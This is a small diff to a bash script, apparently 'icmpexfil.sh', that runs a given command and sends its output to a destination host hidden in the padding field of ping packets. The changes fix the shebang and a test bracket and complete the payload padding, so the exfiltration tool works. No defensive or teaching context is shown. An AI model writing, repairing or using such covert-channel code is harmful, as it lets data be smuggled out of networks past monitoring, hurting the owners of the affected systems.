@@ -1,7 +1,7 @@
-!/usr/bin/env bash
+#!/usr/bin/env bash
 
 echo "${@:2}"
-if [[-z "$1" ]] || [[ -z "$2" ]];
+if [[ -z "$1" ]] || [[ -z "$2" ]];
 then
         echo "usage : icmpexfil.sh <destination> <command>"
         exit
@@ -21,6 +21,7 @@ do
                 PAYLOAD=$ROW
         else 
                 PAD=$(printf "%0$(expr 32 - ${#ROW})d" 0)
+                PAYLOAD=$ROW$PAD
         fi
         ping -c 1 -p $PAYLOAD $DEST
 
